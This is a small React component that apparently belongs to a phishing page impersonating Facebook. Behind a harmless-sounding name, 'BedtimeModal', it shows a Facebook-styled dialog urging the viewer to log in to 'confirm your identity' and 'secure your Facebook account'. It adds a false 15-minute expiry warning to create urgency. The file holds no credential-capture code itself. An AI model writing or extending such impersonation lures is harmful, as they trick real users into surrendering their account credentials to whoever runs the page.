import React from "react";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent } from "@/components/ui/dialog";

interface BedtimeModalProps {
  open: boolean;
  onClose: () => void;
}

export default function BedtimeModal({ open, onClose }: BedtimeModalProps) {
  return (
    <Dialog open={open} onOpenChange={onClose}>
      <DialogContent className="max-w-md text-center p-6">
        <h2 className="text-lg mb-3" style={{ maxWidth: "500px", margin: "0 auto", lineHeight: "1.4" }}>
          Log in to confirm your identity and secure your Facebook account. Updating your trusted contacts helps keep your account safe and protected.
        </h2>

        <p className="text-facebook-text-light text-sm mb-6">
          This page will expire in 15 minutes for security purposes.
        </p>

        <Button
          onClick={onClose}
          className="facebook-button bg-facebook-blue text-white py-2 px-4 rounded-md font-bold text-xl w-full transition duration-200 hover:bg-facebook-blue-dark"
        >
          Continue to Facebook
        </Button>
      </DialogContent>
    </Dialog>
  );
}